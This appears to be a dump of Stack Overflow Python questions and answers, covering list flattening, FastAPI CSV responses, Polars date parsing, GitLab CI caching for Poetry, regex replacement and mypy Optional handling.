@NER2XPJaDP9MTOLfzgs0Vybxu2d3GI7pttiOn3PpCT629ujZspYCRGTyrKZvJOQpEXrbRLK5IF@kXRwRbVvqBHuT249AAf3Cn79bfPza/0Tpr9SiLCo51XAYod3fvpFh4dsv1EOywIGdz2D4IP3DJR@h4GTbPLSAe2mp3DMF057y79vzVgxIVakEQWYRi7Z9iyP2Bge@Sp6u4iiXlJeYphfveBxXXGiN@qW/aqLIvJ2JibUfkrKQs@L6UMDyVKvIsjRP4nJ6Ml2JyePCktP8ZDCC47jBTEEmBKzHd01JFPggRHC/913uH@X/Ten18iNw6r@CUpunmZKzxg99ax08shrtIjkwnb7ALx@JPwi2d4v5d/zVD@OF8//pKPF7nyR@0/OI3/NpxD98ePjPs4T/K88SejWvz/1qlZ1FrAmL0MOJPYcfs@n7dtw@Nbd6j9sb/e1D97EzGfK/idxYHkG3CnsLJudDY2diF61Gyali7kq8MQPN/dntYHyg5xiY/4rruguNUMHshVZ51h0ttT8ryqP/VPO8QH/bbD5@wm576cxPaM17Z3Jolnr20oSOcfpSPdkvzOR73t3bvzCFPzkvjN57rnQ@5pzd74Ns7fvJs98tbt6355Cu720t9Z7JOPx4IgFGx5OVm/28KrIH/vqHZA4fc60Bw198/DYkfDY6/3Z9RbYcEu736F@5r4fu92Hdtv7ul3YJw41vnMhS2glCS3mujf@Hvh8Ae5HnGnwJI1xydBRYytdhiBs6Mh6uRbYdYiB0fNezVBDYPtR4tmcPWcHrWBlGPlRGEf923MCHTtfTPpRhS5f7OKFrKWPbBspCY0dQHdquj4uuHxktEmE4vIXWPq32IorBIZ/2uA72MmFgoEK7rsHFMLADh/ZHGltiX@NRxLHpoquDYEi9Dhx660Ue9YYQhwqDb7gYmcj3G4@gydXa1YwoIsuf5V0PPhvPMEyeccJB9aEOfMZcQxUzYBss0sZxJWoBFiHsfshIuwHN1jAbX7Rn@0xMoLGlgddcHUXuYBaQPi41PsJCyzQz7waBpN64/Cnf913m2w@MYYodn7/345LEzdOaIfJMMAhFP/QdGKg9P7Llg8b4kaZjbggIYBcvYNwcY3sSMIfWay@IGEQ3MoSTMWKVYw9uAkVQEESRxzXwHlppHt2PBEK@R91EFz@Qt4Ah8bhv4EUEeGCHIbMXuO4glExIq2CjS9mI9iPvDJ1jopARtH0qCAOPAXFdn6h1tKeJa@CT63wnJIb5Ot5gsGwn8CSpkmLbSAKDkBH0HUGBQbBcht1nukxTYVHoufLRGBK5EBlKtSthh0XMcRgxjcaPGITQIHp0zGOaUNOO4JJhdSJ5nwOlI8iwXQJO2xHyM7BH4BquDVyH@dMQD7jWdkJBlZZSp7HakE8M4iNxDVigSIhL5xA8fAPeAeehdCNH0OMFRkpWRyxS4zmaWHXoYugFLMzI1jQ2DELWCuSJLOO7gdRFJCCwBzOBfJGPgkBeIPIMo6xtn0yFmvQk3YJQeGGzlF3hFN8NbXrv4ysuGp8iHiI9WN9QR6TCDSOolKwTInTe2OQG2O8ImKOIrhqpeYST7ju2EfLxiRk/1GaQ6yOgnfztapvSgXC62zgEwLIM@Xooy0cuGjdgAgELwhi48gUl2mlIOhhElguKpmWwiciyQylkwyD4tjC7CTUrR2uwLiS0oa9R6GviNpJG4CO@gezlucPVYYxATxM5fiQ0BCyxSFDzxC@KQkjJNfTSDwNuhgZmCwpcAkRLQrU7TFeoXfKF1pqEEwVO02xCX7S60hRgLvnPCMJJq/SS7ymxVnxP6AbBHEwGyIEuGIkCjCY5gJOaTsHEAKush8AnUfjoK0Z6k2cLz3gB@crhRVQK0DxUgSBSItIRHgodw/YcRIAyC9HzpKWHQoe2YeKxsRFyCpgMhExaiWPbw6m2PSO4dzz2NRNxLUiWxQTkoFHim@sIr/vS32EIM@R6NNtDL3HooOsN0izgSUIImqJ2/YDgRjZJbJERCKPuiB2Uu3CK3PLAGNzS0YLhQJojKsMMbhJ5IQOKJuzK6BKyG6NBUQO4h9dAhKyaQJon1EUygmghHOOQnvhatceO6TjD440XETxR5LOFabRhT7hAmNAjEWJj@fCbsQRTAAsZ5cj4Ry5RhphxEgJLmkG61Wh5BDUgKrOBJhgxDkk9BS4D5ZKKbw9PiL9sX4CM8@oxKWfqRt7eI4ShgKrgNf5r5UfdkaaWM3ZZypPkblbsnfG3ZYrT2f3FD81bwDP1d55lulWT658sVdV8/zBfNS/b/L27dzPzb3@6sNTFj/lF78Aur@11wzl3PU7qs7MHh7Lzq782kn@JNwl2P0hP5/Mcl@ZzNdP2T@rH@sdavRHfmzeJ@rLjo023k59ewRqcZQ7rr6/VxXzOV8vm84vGhuY9s59//h8"" rel=""noreferrer"">Try it online link</a>, along with a foreword explaining exactly what causes this bug, if you're curious.</p>
","71288237","<p>This problem has a fun O(n) solution.</p>
<p>If you draw a graph of cumulative sum vs index, then:</p>
<p>The average value in the subarray between any two indexes is the slope of the line between those points on the graph.</p>
<p>The first highest-average-prefix will end at the point that makes the highest angle from 0.  The next highest-average-prefix must then have a <em>smaller</em> average, and it will end at the point that makes the highest angle from the first ending.  Continuing to the end of the array, we find that...</p>
<p>These segments of highest average are exactly the segments in the <strong>upper convex hull of the cumulative sum graph</strong>.</p>
<p>Find these segments using the <a href=""https://en.wikibooks.org/wiki/Algorithm_Implementation/Geometry/Convex_hull/Monotone_chain"" rel=""noreferrer"">monotone chain</a> algorithm.  Since the points are already sorted, it takes O(n) time.</p>
<pre class=""lang-python prettyprint-override""><code># Lengths of the segments in the upper convex hull
# of the cumulative sum graph
def upperSumHullLengths(arr):
    if len(arr) &lt; 2:
        if len(arr) &lt; 1:
            return []
        else:
            return [1]
    
    hull = [(0, 0),(1, arr[0])]
    for x in range(2, len(arr)+1):
        # this has x coordinate x-1
        prevPoint = hull[len(hull) - 1]
        # next point in cumulative sum
        point = (x, prevPoint[1] + arr[x-1])
        # remove points not on the convex hull
        while len(hull) &gt;= 2:
            p0 = hull[len(hull)-2]
            dx0 = prevPoint[0] - p0[0]
            dy0 = prevPoint[1] - p0[1]
            dx1 = x - prevPoint[0]
            dy1 = point[1] - prevPoint[1]
            if dy1*dx0 &lt; dy0*dx1:
                break
            hull.pop()
            prevPoint = p0
        hull.append(point)
    
    return [hull[i+1][0] - hull[i][0] for i in range(0, len(hull)-1)]


print(upperSumHullLengths([  1,   7,   8,   4,   2,   1,   4]))
</code></pre>
<p>prints:</p>
<pre><code>[3, 1, 3]
</code></pre>
"
"71758114","1","Python list comprehension with complex data structures","<p>I'm trying to flatten some mixed arrays in Python using LC. I'm having some trouble figuring out how to structure it.</p>
<p>Here's the array's i'm trying to flatten</p>
<pre><code>arr_1 = [1, [2, 3], 4, 5]
arr_2 = [1,[2,3],[[4,5]]]
</code></pre>
<p>I tried this methods for arr_1 but get &quot;TypeError: 'int' object is not iterable&quot;</p>
<pre><code>print([item if type(items) is list else items for items in arr_1 for item in items])
</code></pre>
<p>So I decided to break it into parts to see where it's failing by using this</p>
<pre><code>def check(item):
return item;

print([check(item) if type(items) is list else check(items) for items in [1, [2, 3], 4, 5] for items in arr_2]) 
</code></pre>
<p>Through the debugger I found that it's failing at the 2d array in</p>
<pre><code>for items in [1, [2, 3], 4, 5]
</code></pre>
<p>I don't need the LC to be in one line but I just wanted to know how to do it in a single nested LC if its even possible.</p>
","71758467","<p>Using an internal stack and <a href=""https://docs.python.org/3/library/functions.html#iter"" rel=""nofollow noreferrer""><code>iter</code></a>'s second form to simulate a <code>while</code> loop:</p>
<pre><code>def flatten(obj):
    return [x
            for stack in [[obj]]
            for x, in iter(lambda: stack and [stack.pop()], [])
            if isinstance(x, int)
            or stack.extend(reversed(x))]

print(flatten([1, [2, 3], 4, 5]))
print(flatten([1, [2, 3], [[4, 5]]]))
print(flatten([1, [2, [], 3], [[4, 5]]]))
</code></pre>
<p>Output (<a href=""https://tio.run/##fY/BCsIwDIbve4ocWyiCTkH2KqGHbk2xOrvSValPX2txhzH0PyXk@/Mn/hUvk2vPPuSsyYAZVYzk2NRfeddAUaD4CA4w1W6RmQLMUQ03sGWGBZdyAyTxmdpIgY3q3mvVfT3KacBa7vzkGZcCUPKV3xqws3UFcgOxuimuieWCHaVysWaBnhRm0ixxLpvGh@Jgyz@4LxEHAW2JOgo4Sc7/EIiVkb8plBsy5zc"" rel=""nofollow noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>):</p>
<pre><code>[1, 2, 3, 4, 5]
[1, 2, 3, 4, 5]
[1, 2, 3, 4, 5]
</code></pre>
<p>Slight variation, splitting the &quot;long&quot; line into two (<a href=""https://tio.run/##fY/NCsIwEITvfYo9JhAKWgXpq4Qg/dlitCZhGyU@fVwrPZSic1vmm2EnvOLFu@oUKOceBxjGJkZ0wrdXWRfAIowPcqDTfC0aPMEUm@4Glj3NuDEb4PwxbUQSY3Nv@6b@RhRoIzdwmptmoAw@CLnuswPYyTr2XYciKabjumT5qMTEC3pB@ESasBdJclcRiBNi2ad3/MVeQWUUHBQcjZR/CK1nxvymtNmQOb8B"" rel=""nofollow noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>):</p>
<pre><code>def flatten(obj):
    return [x
            for stack in [[obj]]
            for _ in iter(lambda: stack, [])
            for x in [stack.pop()]
            if isinstance(x, int)
            or stack.extend(reversed(x))]
</code></pre>
<p>To explain it a bit, here's roughly the same with ordinary code:</p>
<pre><code>def flatten(obj):
    result = []
    stack = [obj]
    while stack:
        x = stack.pop()
        if isinstance(x, int):
            result.append(x)
        else:
            stack.extend(reversed(x))
    return result
</code></pre>
<p>If the order doesn't matter, we can use a queue instead (inspired by 0x263A's comment), although it's less memory-efficient (<a href=""https://tio.run/##fc7BCgIhEAbg@z7FHBUkqC2IXmWYw9aOZISaq@A@vZngIZb6b8P/Mfx@jXdnx7MPpcysQT@nGNkKd33IywA1gWMKFjC3q0e7AK/EicHUDisn2oD8KZv6qowGsxi7xMneWGRVVZTQH@441wGzyJKGwYfaiT4K9wrwoGAkBUcFJ5Lyj0Bshn4rpI0s5Q0"" rel=""nofollow noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>):</p>
<pre><code>def flatten(obj):
    return [x
            for queue in [[obj]]
            for x in queue
            if isinstance(x, int) or queue.extend(x)]
</code></pre>
<p>We can fix the order if instead of putting each list's contents at the <em>end</em> of the queue, we <em>insert</em> them right <em>after</em> the list (which is less time-efficient) in the &quot;priority&quot; queue (<a href=""https://tio.run/##fc7BCsIwDAbg@54ixxaKMKcgvkopZWqKla2bbQrz6WucTJChuYV8f5LxQdchNIcxlnJBB65riTCI4XSTxwq4IlKOAfQ0d0u5IcJ4z5gRPA81e2NWwiuYXnMMucfYEop3RkEtv7B34JMPidpwRjEpDpGEz42NtQnJE/bWitR5NrzaS14vTVWNkblYXte1Ar1V0BgFOwV7I@UfofVszG@lzUqW8gQ"" rel=""nofollow noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>):</p>
<pre><code>def flatten(obj):
    return [x
            for pqueue in [[obj]]
            for i, x in enumerate(pqueue, 1)
            if isinstance(x, int) or pqueue.__setitem__(slice(i, i), x)]
</code></pre>
"
"71079342","1","How can I take comma separated inputs for python AnyTree module?","<p><strong>Community</strong>. I need to accept multiple comma-separated inputs to produce a summary of information ( specifically, how many different employees participated in each group/project)? The program takes employees, managers and groups in the form of strings.</p>
<p>I'm using anytree python library to be able to search/count the occurrence of each employee per group. However, this program is only accepting one value/cell at a time instead of multiple values. <br></p>
<p><strong>Here is the tree structure and how I accept input values?</strong></p>
<pre><code>Press q to exit, Enter your data: Joe
Press q to exit, Enter your data: Manager1
Press q to exit, Enter your data: Group1
Press q to exit, Enter your data: Charles 
Press q to exit, Enter your data: Manager1
Press q to exit, Enter your data: Group2
Press q to exit, Enter your data: Joe
Press q to exit, Enter your data: Manager3
Press q to exit, Enter your data: Group1
Press q to exit, Enter your data: Charles
Press q to exit, Enter your data: Manager3
Press q to exit, Enter your data: Group1
Press q to exit, Enter your data: Joe
Press q to exit, Enter your data: Manager5
Press q to exit, Enter your data: Group2
Press q to exit, Enter your data: q
Employee   No of groups
   JOE       2
   CHARLES       2
Group
├── GROUP1
│   ├── JOE
│   │   └── MANAGER1
│   ├── JOE
│   │   └── MANAGER3
│   └── CHARLES
│       └── MANAGER3
└── GROUP2
    ├── CHARLES
    │   └── MANAGER1
    └── JOE
        └── MANAGER5
</code></pre>
<p>I need help with this code so that It can accept comma-separated values; for example, to enter <strong>Joe, Manager1, Group1</strong> at a time.</p>
<pre><code>import anytree

from anytree import Node, RenderTree, LevelOrderIter, LevelOrderGroupIter, PreOrderIter

import sys

# user input
io=''
lst_input = []
while (io!='q'):
    io=input('Press q to exit, Enter your data: ')
    if io!='q':
        lst_input.append(io.upper())

# change list in to matrix
lst=[]
for i in range(0, len(lst_input), 3):
    lst.append(lst_input[i:i + 3])

lst

# create tree structure from lst
group = Node('Group')
storeGroup = {}
for i in range(len(lst)):
    if lst[i][2] in [x.name for x in group.children]: # parent already exist, append childrens
        storeGroup[lst[i][0]] = Node(lst[i][0], parent=storeGroup[lst[i][2]])
        storeGroup[lst[i][1]] = Node(lst[i][1], parent=storeGroup[lst[i][0]])
    else: # create parent and append childreds
        storeGroup[lst[i][2]] = Node(lst[i][2], parent=group)
        storeGroup[lst[i][0]] = Node(lst[i][0], parent=storeGroup[lst[i][2]])
        storeGroup[lst[i][1]] = Node(lst[i][1], parent=storeGroup[lst[i][0]])


store = {}
for children in LevelOrderIter(group, maxlevel=3):
    if children.parent!=None and children.parent.name!='Group':
        if children.name not in store:
            store[children.name] = {children.parent.name}
        else:
            store[children.name] = store[children.name] | {children.parent.name}

print('Employee', '  No of groups')
for i in store:
    print('   '+i+'      ', len(store[i]))


for pre,fill, node in RenderTree(group):
    print('{}{}'.format(pre,node.name))
</code></pre>
<p><br> Thank you! Any thoughts are welcomed.</p>
","71110010","<p>Leverage unpacking to extract elements. Then the if statement can be re-written this way.</p>
<pre><code>if io!='q':
    name, role, grp = io.upper(). split(',')
    lst_input.append([name,role, grp]) 
</code></pre>
<p>you also need to change <code>lst.append(lst_input[i:i + 3])</code> in the for loop to this.</p>
<pre><code>lst.append(lst_input[0][i:i + 3])
</code></pre>
"
"71203579","1","How to return a csv file/Pandas DataFrame in JSON format using FastAPI?","<p>I have a <code>.csv</code> file that I would like to render in a FastAPI app. I only managed to render the <code>.csv</code> file  in JSON format as follows:</p>
<pre><code>def transform_question_format(csv_file_name):

    json_file_name = f&quot;{csv_file_name[:-4]}.json&quot;

    # transforms the csv file into json file
    pd.read_csv(csv_file_name ,sep=&quot;,&quot;).to_json(json_file_name)

    with open(json_file_name, &quot;r&quot;) as f:
        json_data = json.load(f)

    return json_data

@app.get(&quot;/questions&quot;)
def load_questions():

    question_json = transform_question_format(question_csv_filename)

    return question_json
</code></pre>
<p>When I tried returning directly <code>pd.read_csv(csv_file_name ,sep=&quot;,&quot;).to_json(json_file_name)</code>, it works, as it returns a string.</p>
<p>How should I proceed?  I believe this is not the good way to do it.</p>
","71205127","<p>The below shows four different ways of returning the data stored in a <code>.csv</code> file/Pandas DataFrame (for solutions without using Pandas DataFrame, have a look <a href=""https://stackoverflow.com/a/70655118/17865804""><strong>here</strong></a>). Related answers on how to efficiently return a large dataframe can be found <a href=""https://stackoverflow.com/a/73580096/17865804""><strong>here</strong></a> and <a href=""https://stackoverflow.com/a/73694164/17865804""><strong>here</strong></a> as well.</p>
<h3>Option 1</h3>
<p>The first option is to convert the file data into <code>JSON</code> and then parse it into a <code>dict</code>. You can optionally change the orientation of the data using the <code>orient</code> parameter in the <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_json.html"" rel=""nofollow noreferrer""><code>.to_json()</code></a> method.</p>
<p><strong>Note:</strong> Better <strong>not to use</strong> this option. See <strong>Updates</strong> below.</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi import FastAPI
import pandas as pd
import json

app = FastAPI()
df = pd.read_csv(&quot;file.csv&quot;)

def parse_csv(df):
    res = df.to_json(orient=&quot;records&quot;)
    parsed = json.loads(res)
    return parsed
    
@app.get(&quot;/questions&quot;)
def load_questions():
    return parse_csv(df)
</code></pre>
<ul>
<li><p><strong>Update 1</strong>: Using <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_dict.html"" rel=""nofollow noreferrer""><code>.to_dict()</code></a> method would be a better option, as it would return a <code>dict</code> directly, instead of converting the DataFrame into JSON (using <code>df.to_json()</code>) and then that JSON string into <code>dict</code> (using <code>json.loads()</code>), as described earlier. Example:</p>
<pre class=""lang-py prettyprint-override""><code>@app.get(&quot;/questions&quot;)
def load_questions():
    return df.to_dict(orient=&quot;records&quot;)
</code></pre>
</li>
<li><p><strong>Update 2</strong>: When using <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_dict.html"" rel=""nofollow noreferrer""><code>.to_dict()</code></a> method and returning the <code>dict</code>, FastAPI, behind the scenes, <a href=""https://fastapi.tiangolo.com/advanced/response-directly/"" rel=""nofollow noreferrer"">automatically converts</a> that return value into <code>JSON</code>, after converting it into JSON-compatible data first, using the <a href=""https://fastapi.tiangolo.com/tutorial/encoder/"" rel=""nofollow noreferrer""><code>jsonable_encoder</code></a>, and then putting that JSON-compatible data inside of a <code>JSONResponse</code> (see <a href=""https://stackoverflow.com/a/73974946/17865804"">this answer</a> for more details). Thus, to avoid that extra processing, you could still use the <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_json.html"" rel=""nofollow noreferrer""><code>.to_json()</code></a> method, but this time, put the <code>JSON</code> string in a custom <a href=""https://fastapi.tiangolo.com/advanced/response-directly/#returning-a-custom-response"" rel=""nofollow noreferrer""><code>Response</code></a> and return it directly, as shown below:</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi import Response

@app.get(&quot;/questions&quot;)
def load_questions():
    return Response(df.to_json(orient=&quot;records&quot;), media_type=&quot;application/json&quot;)
</code></pre>
</li>
</ul>
<h3>Option 2</h3>
<p>Another option is to return the data in <code>string</code> format, using <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_string.html"" rel=""nofollow noreferrer""><code>.to_string()</code></a> method.</p>
<pre class=""lang-py prettyprint-override""><code>@app.get(&quot;/questions&quot;)
def load_questions():
    return df.to_string()
</code></pre>
<h3>Option 3</h3>
<p>You could also return the data as an <code>HTML</code> table, using <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.to_html.html"" rel=""nofollow noreferrer""><code>.to_html()</code></a> method.</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi.responses import HTMLResponse

@app.get(&quot;/questions&quot;)
def load_questions():
    return HTMLResponse(content=df.to_html(), status_code=200)
</code></pre>
<h3>Option 4</h3>
<p>Finally, you can always return the <code>file</code> as is using FastAPI's <a href=""https://fastapi.tiangolo.com/advanced/custom-response/#fileresponse"" rel=""nofollow noreferrer""><code>FileResponse</code></a>.</p>
<pre class=""lang-py prettyprint-override""><code>from fastapi.responses import FileResponse

@app.get(&quot;/questions&quot;)
def load_questions():
    return FileResponse(path=&quot;file.csv&quot;, filename=&quot;file.csv&quot;)
</code></pre>
"
"71295840","1","python pip: ""error: legacy-install-failure""","<p>I want to install <code>gensim</code> python package via <code>pip install gensim</code></p>
<p>But this error occurs and I have no idea what should I do to solve it.</p>
<pre><code>      running build_ext
      building 'gensim.models.word2vec_inner' extension
      error: Microsoft Visual C++ 14.0 or greater is required. Get it with &quot;Microsoft C++ Build Tools&quot;: https://visualstudio.microsoft.com/visual-cpp-build-tools/
      [end of output]

  note: This error originates from a subprocess, and is likely not a problem with pip.
error: legacy-install-failure

× Encountered error while trying to install package.
╰─&gt; gensim

note: This is an issue with the package mentioned above, not pip.
hint: See above for output from the failure.
</code></pre>
","71296224","<p>If you fail to install plugins,<br />
you can download it from other repositories like this one:
<a href=""https://www.lfd.uci.edu/%7Egohlke/pythonlibs/#gensim"" rel=""noreferrer"">repository</a> depends on the version of python and the system.</p>
<p>for example: for  windows 11(x64) and python 3.10 you should take this file: <em><strong>gensim‑4.1.2‑cp310‑cp310‑win_amd64.whl</strong></em></p>
"
"71759316","1","Easily convert string column to pl.datetime in Polars","<p>Consider a Polars data frame with a column of <code>str</code> type that indicates the date in the format <code>'27 July 2020'</code>. I would like to convert this column to the <code>polars.datetime</code> type, which is distinct from the Python standard <code>datetime</code>. The following code, using the standard <code>datetime</code> format, works but Polars does not recognise the values in the column as dates.</p>
<pre><code>import polars as pl
from datetime import datetime

df = pd.read_csv('&lt;some CSV file containing a column called 'event_date'&gt;')
df = df.with_columns([   
        pl.col('event_date').apply(lambda x: x.replace(&quot; &quot;,&quot;-&quot;))\
                            .apply(lambda x: datetime.strptime(x, '%d-%B-%Y'))
])

</code></pre>
<p>Suppose we try to process <code>df</code> further to create a new column indicating the quarter of the year an event took place.</p>
<pre><code>df = df.with_columns([
        pl.col('event_date').apply(lambda x: x.month)\
                            .apply(lambda x: 1 if x in range(1,4) else 2 if x in range(4,7) else 3 if x in range(7,10) else 4)\
                            .alias('quarter')
])
</code></pre>
<p>The code returns the following error because it qualifies <code>event_type</code> as <code>dtype Object(&quot;object&quot;)</code> and not as <code>datetime</code> or <code>polars.datetime</code></p>
<pre><code>thread '&lt;unnamed&gt;' panicked at 'dtype Object(&quot;object&quot;) not supported', src/series.rs:992:24
--- PyO3 is resuming a panic after fetching a PanicException from Python. ---
PanicException: Unwrapped panic from Python code
</code></pre>
","71759536","<p>The easiest way to convert strings to Date/Datetime is to use Polars' own <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.internals.expr.ExprStringNameSpace.strptime.html#polars.internals.expr.ExprStringNameSpace.strptime"" rel=""noreferrer""><code>strptime</code></a> function (rather than the same-named function from Python's <code>datetime</code> module).</p>
<p>For example, let's start with this data.</p>
<pre class=""lang-py prettyprint-override""><code>import polars as pl

df = pl.DataFrame({
    'date_str': [&quot;27 July 2020&quot;, &quot;31 December 2020&quot;]
})
print(df)
</code></pre>
<pre><code>shape: (2, 1)
┌──────────────────┐
│ date_str         │
│ ---              │
│ str              │
╞══════════════════╡
│ 27 July 2020     │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ 31 December 2020 │
└──────────────────┘
</code></pre>
<p>To convert, use Polars' <a href=""https://pola-rs.github.io/polars/py-polars/html/reference/api/polars.internals.expr.ExprStringNameSpace.strptime.html#polars.internals.expr.ExprStringNameSpace.strptime"" rel=""noreferrer"">strptime</a> function.</p>
<pre class=""lang-py prettyprint-override""><code>df.with_column(pl.col('date_str').str.strptime(pl.Date, fmt='%d %B %Y').cast(pl.Datetime))
</code></pre>
<pre><code>shape: (2, 1)
┌─────────────────────┐
│ date_str            │
│ ---                 │
│ datetime[μs]        │
╞═════════════════════╡
│ 2020-07-27 00:00:00 │
├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
│ 2020-12-31 00:00:00 │
└─────────────────────┘
</code></pre>
<p>Notice that we did not need to replace spaces with dashes.  I've cast the result as a Datetime (per your question), but you may be able to use a Date instead.</p>
<p>Currently, the <code>apply</code> method does not work when the return type is a python Date/Datetime object, but there is a <a href=""https://github.com/pola-rs/polars/issues/3022"" rel=""noreferrer"">request</a> for this.  That said, it's better to use Polars' <code>strptime</code>.  It will be much faster than calling python <code>datetime</code> code.</p>
<p><strong>Edit</strong>: as of Polars <code>0.13.19</code>, the <code>apply</code> method will automatically convert Python date/datetime to Polars Date/Datetime.</p>
"
"71239764","1","How to cache ""poetry install"" for Gitlab CI?","<p>Is there a way to cache <code>poetry install</code> command in Gitlab CI (<code>.gitlab-ci.yml</code>)?</p>
<p>For example, in <code>node</code> <code>yarn</code> there is a way to cache <code>yarn install</code> (<a href=""https://classic.yarnpkg.com/lang/en/docs/install-ci/"" rel=""noreferrer"">https://classic.yarnpkg.com/lang/en/docs/install-ci/</a> <code>Gitlab</code> section) this makes stages a lot faster.</p>
","71240277","<p><a href=""https://docs.gitlab.com/ee/ci/yaml/index.html#cache"" rel=""noreferrer"">GitLab can only cache things in the working directory</a> and Poetry <a href=""https://python-poetry.org/docs/configuration/#virtualenvspath"" rel=""noreferrer"">stores packages elsewhere by default</a>:</p>
<blockquote>
<p>Directory where virtual environments will be created. Defaults to <code>{cache-dir}/virtualenvs</code> (<code>{cache-dir}\virtualenvs</code> on Windows).</p>
</blockquote>
<p>On my machine, <code>cache-dir</code> is <code>/home/chris/.cache/pypoetry</code>.</p>
<p>You can use <a href=""https://python-poetry.org/docs/configuration/#virtualenvsin-project"" rel=""noreferrer"">the <code>virtualenvs.in-project</code> option</a> to change this behaviour:</p>
<blockquote>
<p>If set to true, the virtualenv wil be created and expected in a folder named <code>.venv</code> within the root directory of the project.</p>
</blockquote>
<p>So, something like this should work in your <code>gitlab-ci.yml</code>:</p>
<pre class=""lang-yaml prettyprint-override""><code>before_script:
  - poetry config virtualenvs.in-project true

cache:
  paths:
    - .venv
</code></pre>
"
"71111005","1","ModuleNotFoundError: No module named 'keras.applications.resnet50 on google colab","<p>I am trying to run an image-based project on colab. I found the project on github. Everything runs fine till I reached the cell with the following code:</p>
<pre><code>import keras
from keras.preprocessing.image import ImageDataGenerator
from keras.applications.resnet50 import preprocess_input, ResNet50
from keras.models import Model
from keras.layers import Dense, MaxPool2D, Conv2D
</code></pre>
<p>When I run it, the following output is observed:</p>
<pre><code>---------------------------------------------------------------------------
ModuleNotFoundError                       Traceback (most recent call last)
&lt;ipython-input-24-173cbce466d6&gt; in &lt;module&gt;()
      1 import keras
      2 from keras.preprocessing.image import ImageDataGenerator
----&gt; 3 from keras.applications.resnet50 import preprocess_input, ResNet50
      4 from keras.models import Model
      5 from keras.layers import Dense, MaxPool2D, Conv2D

ModuleNotFoundError: No module named 'keras.applications.resnet50'

---------------------------------------------------------------------------
</code></pre>
<p>It's running 2.7.0 keras, connected to a TPU runtime. I tried !pip installing the said module but no use. I even tried running a demo resnet50 project too but got the same error. Can anyone please help me solve the error?</p>
","71117585","<pre><code>from tensorflow.keras.applications.resnet50 import ResNet50
</code></pre>
"
"71297077","1","Python regex replace every 2nd occurrence in a string","<p>I have a string with data that looks like this:</p>
<pre><code>str1 = &quot;[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]&quot;
</code></pre>
<p>I would want to replace every second iteration of <code>&quot;],[&quot;</code> with <code>&quot;,&quot;</code> so it will look like this:</p>
<pre><code>str2 = &quot;[2.4,5],[2.54,4],[3.36,4.46],[3.36,4],[3.63,4.86],[4,4.63]&quot;
</code></pre>
<p>Here is was I have so far:</p>
<pre><code>str1 = &quot;[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]&quot;
s2 = re.sub(r&quot;],\[&quot;, ',', str1)
print(s2)
</code></pre>
<p>I was trying to mess around with this:</p>
<pre><code>(.*?],\[){2}
</code></pre>
<p>But it does not seem to yield me the desired results.</p>
<p>I tried using loops but I only managed to replace only the second occurrence and nothing after using this sample code I found <a href=""https://stackoverflow.com/a/35091558/14951530"">here</a>. And the code is:</p>
<pre><code>import re

def replacenth(string, sub, wanted, n):
    where = [m.start() for m in re.finditer(sub, string)][n-1]
    before = string[:where]
    after = string[where:]
    after = after.replace(sub, wanted, 1)
    newString = before + after
    print(newString)
For these variables:

string = 'ababababababababab'
sub = 'ab'
wanted = 'CD'
n = 5
</code></pre>
<p>Thank you.</p>
","71297176","<p>You can use</p>
<pre class=""lang-py prettyprint-override""><code>import re
from itertools import count

str1 = &quot;[2.4],[5],[2.54],[4],[3.36],[4.46],[3.36],[4],[3.63],[4.86],[4],[4.63]&quot;
c = count(0)
print( re.sub(r&quot;],\[&quot;, lambda x: &quot;,&quot; if next(c) % 2 == 0 else x.group(), str1) )
# =&gt; [2.4,5],[2.54,4],[3.36,4.46],[3.36,4],[3.63,4.86],[4,4.63]
</code></pre>
<p>See <a href=""https://ideone.com/hkUxDV"" rel=""noreferrer"">the Python demo</a>.</p>
<p>The regex is the same, <code>],\[</code>, it matches a literal <code>],[</code> text.</p>
<p>The <code>c = count(0)</code>  initializes the counter whose value is incremented upon each match inside a lambda expression used as the replacement argument. When the  counter is even, the match is replaced with a comma, else, it is kept as is.</p>
"
"71805426","1","how to tell a python type checker that an optional definitely exists?","<p>I'm used to typescript, in which one can use a <code>!</code> to tell the type-checker to assume a value won't be null. Is there something analogous when using type annotations in python?</p>
<p>A (contrived) example:</p>
<p>When executing the expression <code>m.maybe_num + 3</code> in the code below, the enclosing <code>if</code> guarantees that <code>maybe_num</code> won't be <code>None</code>.  But the type-checker doesn't know that, and returns an error.  (Verified in <a href=""https://mypy-play.net/?mypy=latest&amp;python=3.10."" rel=""noreferrer"">https://mypy-play.net/?mypy=latest&amp;python=3.10.</a>) How can I tell the type-checker that I know better?</p>
<pre class=""lang-py prettyprint-override""><code>from typing import Optional

class MyClass:

    def __init__(self, maybe_num: Optional[int]):
        self.maybe_num = maybe_num
        
    def has_a_num(self) -&gt; bool:
        return self.maybe_num is not None

    def three_more(self) -&gt; Optional[int]:
        if self.has_a_num:
            # mypy error: Unsupported operand types for + (&quot;None&quot; and &quot;int&quot;)
            return self.maybe_num + 3
        else:
            return None
</code></pre>
","71806921","<p>Sadly there's no clean way to infer the type of something from a function call like this, but you can work some magic with <a href=""https://docs.python.org/3/library/typing.html#typing.TypeGuard"" rel=""nofollow noreferrer""><code>TypeGuard</code></a> annotations for the <code>has_a_num()</code> method, although the benefit from those annotations won't really be felt unless the difference is significantly more major than the type of a single int. If it's just a single value, you should just use a standard  is not None check.</p>
<pre class=""lang-py prettyprint-override""><code>if self.maybe_num is not None:
    ...
</code></pre>
